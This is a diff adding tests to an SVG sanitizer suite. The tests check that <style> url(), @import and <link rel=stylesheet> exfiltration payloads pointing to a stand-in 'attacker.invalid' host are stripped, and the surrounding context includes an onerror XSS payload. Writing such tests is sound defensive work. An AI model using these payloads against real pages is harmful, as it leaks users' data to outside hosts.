@@ -946,6 +946,21 @@ uiSuite("SVG Sanitizer (XSS)", [
     const out = sanitizeSvgMarkup('<foreignObject><img src=x onerror=alert(1)></foreignObject>');
     return !/<foreignobject/i.test(out) && !/onerror/i.test(out);
   }},
+  // CSS-based zero-click exfil: <style>/<link> inside SVG fire an outbound GET
+  // via url() / @import / rel=stylesheet with no CSP backstop. SAFE_STYLE_KEYS
+  // only filters the style="..." attribute, not <style> element CSS text.
+  { name: "SVG <style> element stripped (CSS url() exfil)", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>* { background: url("https://attacker.invalid/?d=x") }</style><rect/>');
+    return !/<style/i.test(out) && !/attacker\.invalid/i.test(out);
+  }},
+  { name: "SVG <style> @import exfil stripped", fn: async () => {
+    const out = sanitizeSvgMarkup('<style>@import url("https://attacker.invalid/x.css");</style><rect/>');
+    return !/<style/i.test(out) && !/attacker\.invalid/i.test(out) && !/@import/i.test(out);
+  }},
+  { name: "SVG <link rel=stylesheet> stripped", fn: async () => {
+    const out = sanitizeSvgMarkup('<link rel="stylesheet" href="https://attacker.invalid/x.css"/><rect/>');
+    return !/<link/i.test(out) && !/attacker\.invalid/i.test(out);
+  }},
   // Mutation-XSS round-trip: sanitize, then re-parse as HTML exactly like
   // dangerouslySetInnerHTML does, and assert no live event handler materializes.
   { name: "CDATA-in-style mXSS round-trip neutralized", fn: async () => {
